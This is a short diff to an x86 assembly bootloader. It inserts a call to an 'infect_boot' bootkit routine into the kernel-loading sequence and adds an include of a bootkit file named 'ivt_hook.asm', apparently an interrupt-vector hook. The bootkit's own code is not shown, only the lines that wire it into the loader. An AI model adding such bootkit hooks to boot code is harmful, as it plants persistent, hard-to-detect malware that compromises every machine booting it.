@@ -52,6 +52,9 @@ load_kernel:
         cmp ax, 0
         je .error
 
+        ; Infecting boot (bootkit routine)
+        call infect_boot
+
         ; Finishing kernel loading (Real Mode)
         mov si, kload_success
         call print_string
@@ -87,6 +90,7 @@ begin_pm:
     jmp CODE_SEG:KERNEL_OFFSET
 
 %include "protected_mode.asm"
+%include "../bootkit/ivt_hook.asm"
 %include "../utils/print16.asm"
 
 ; Variables
